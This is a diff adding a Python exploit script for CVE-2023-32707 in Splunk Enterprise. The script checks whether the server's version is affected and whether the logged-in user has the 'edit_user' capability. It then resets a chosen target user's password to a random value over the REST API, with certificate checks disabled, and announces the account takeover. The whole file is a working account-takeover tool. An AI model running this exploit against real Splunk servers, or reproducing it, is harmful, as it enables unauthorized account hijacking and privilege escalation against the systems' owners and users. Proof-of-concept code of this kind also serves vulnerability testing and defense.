@@ -1,0 +1,123 @@
+import argparse
+import requests
+import random
+import string
+import base64
+import urllib3
+
+# Ignore warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def print_banner():
+    print("\033[38;5;138m \033[38;5;138m┌\033[38;5;138m─\033[38;5;138m┐\033[38;5;138m \033[38;5;138m┌\033[38;5;138m─\033[38;5;138m┐\033[38;5;138m \033[38;5;138m┬\033[38;5;138m \033[38;5;138m \033[38;5;138m \033[38;5;138m┬\033[38;5;138m \033[38;5;138m┬\033[38;5;138m \033[38;5;138m┌\033[38;5;138m┐\033[38;5;138m┌\033[38;5;138m \033[38;5;138m┬\033[38;5;138m┌\033[38;5;138m─\033[38;5;138m \033[38;5;138m┌\033[38;5;138m─\033[38;5;138m┐\033[38;5;138m \033[38;5;138m┬\033[38;5;138m \033[38;5;138m┬\033[38;5;138m \033[38;5;138m┌\033[38;5;138m┐\033[38;5;138m┌")
+    print("\033[38;5;138m \033[38;5;138m└\033[38;5;138m─\033[38;5;138m┐\033[38;5;139m \033[38;5;139m├\033[38;5;139m─\033[38;5;139m┘\033[38;5;139m \033[38;5;139m│\033[38;5;139m \033[38;5;139m \033[38;5;139m \033[38;5;139m│\033[38;5;139m \033[38;5;139m│\033[38;5;139m \033[38;5;139m│\033[38;5;139m│\033[38;5;139m│\033[38;5;139m \033[38;5;139m├\033[38;5;139m┴\033[38;5;139m┐\033[38;5;139m \033[38;5;139m├\033[38;5;139m─\033[38;5;139m┘\033[38;5;139m \033[38;5;139m│\033[38;5;139m│\033[38;5;139m│\033[38;5;139m \033[38;5;139m│\033[38;5;139m│\033[38;5;139m│")
+    print("\033[38;5;139m \033[38;5;139m└\033[38;5;139m─\033[38;5;139m┘\033[38;5;140m \033[38;5;140m┴\033[38;5;140m \033[38;5;140m \033[38;5;140m \033[38;5;140m┴\033[38;5;140m─\033[38;5;140m┘\033[38;5;140m \033[38;5;140m└\033[38;5;140m─\033[38;5;140m┘\033[38;5;140m \033[38;5;140m┘\033[38;5;140m└\033[38;5;140m┘\033[38;5;140m \033[38;5;140m┴\033[38;5;140m \033[38;5;140m┴\033[38;5;140m \033[38;5;140m┴\033[38;5;140m \033[38;5;140m \033[38;5;140m \033[38;5;140m└\033[38;5;140m┴\033[38;5;140m┘\033[38;5;140m \033[38;5;140m┘\033[38;5;140m└\033[38;5;140m┘")
+
+def is_version_affected(splunk_version):
+    affected_ranges = [
+        {'start': '8.1.0', 'end': '8.1.13'},
+        {'start': '8.2.0', 'end': '8.2.10'},
+        {'start': '9.0.0', 'end': '9.0.4'}
+    ]
+    
+    for range_ in affected_ranges:
+        if compare_versions(range_['start'], splunk_version) <= 0 <= compare_versions(range_['end'], splunk_version):
+            return True
+    return False
+
+def compare_versions(version1, version2):
+    version1 = list(map(int, version1.split('.')))
+    version2 = list(map(int, version2.split('.')))
+    
+    for v1, v2 in zip(version1, version2):
+        if v1 < v2:
+            return -1
+        elif v1 > v2:
+            return 1
+    return 0
+
+def load_proxies_from_file(file_path):
+    proxies = {}
+    try:
+        with open(file_path, 'r') as f:
+            for line in f:
+                protocol, proxy_url = line.strip().split('=')
+                proxies[protocol] = proxy_url
+    except FileNotFoundError:
+        print(f"Proxy file '{file_path}' not found.")
+    except Exception as e:
+        print(f"Error loading proxies from file: {e}")
+    return proxies
+
+def main():
+    try:
+        print_banner()
+
+        parser = argparse.ArgumentParser(description='Splunk Authentication')
+        parser.add_argument('--host', required=True, help='Splunk host or IP address')
+        parser.add_argument('--username', required=True, help='Splunk username')
+        parser.add_argument('--password', required=True, help='Splunk password')
+        parser.add_argument('--target-user', required=True, help='Target user')
+        parser.add_argument('--force-exploit', action='store_true', help='Force exploit')
+        parser.add_argument('--proxy-file', help='File containing proxies')
+
+        args = parser.parse_args()
+
+        splunk_host = args.host.split(':')[0]
+        splunk_username = args.username
+        splunk_password = args.password
+        target_user = args.target_user
+        force_exploit = args.force_exploit
+        proxy_file = args.proxy_file
+
+        splunk_port = args.host.split(':')[1] if len(args.host.split(':')) > 1 else 8089
+        user_endpoint = f"https://{splunk_host}:{splunk_port}/services/authentication/users"
+
+        credentials = f"{splunk_username}:{splunk_password}"
+        base64_credentials = base64.b64encode(credentials.encode()).decode()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
+            'Authorization': f'Basic {base64_credentials}'
+        }
+
+        proxies = {}
+
+        if proxy_file:
+            proxies = load_proxies_from_file(proxy_file)
+
+        response = requests.get(f"{user_endpoint}/{splunk_username}?output_mode=json", headers=headers, proxies=proxies, verify=False)
+
+        if response.status_code == 200:
+            user = response.json()
+            splunk_version = user['generator']['version']
+
+            print(f"Detected Splunk version '{splunk_version}'")
+
+            if is_version_affected(splunk_version) or force_exploit:
+                user_capabilities = user['entry'][0]['content']['capabilities']
+
+                if 'edit_user' in user_capabilities:
+                    print(f"User '{splunk_username}' has the 'edit_user' capability, which would make this target exploitable.")
+                    new_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+                    change_password_payload = {
+                        'password': new_password,
+                        'force-change-pass': 0,
+                        'locked-out': 0
+                    }
+                    response = requests.post(f"{user_endpoint}/{target_user}?output_mode=json", data=change_password_payload, headers=headers, proxies=proxies, verify=False)
+                    if response.status_code == 200:
+                        print(f"Successfully taken over user '{target_user}', log into Splunk with the password '{new_password}'")
+                    else:
+                        print('Account takeover failed')
+                else:
+                    print(f"User '{splunk_username}' does not have the 'edit_user' capability, which makes this target not exploitable by this user.")
+            else:
+                print(f"Splunk version '{splunk_version}' is not affected by CVE-2023-32707")
+        else:
+            print(f"Failed to authenticate to Splunk server '{splunk_host}' with user '{splunk_username}' and password '{splunk_password}'. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+        exit(1)
+
+if __name__ == "__main__":
+    main()
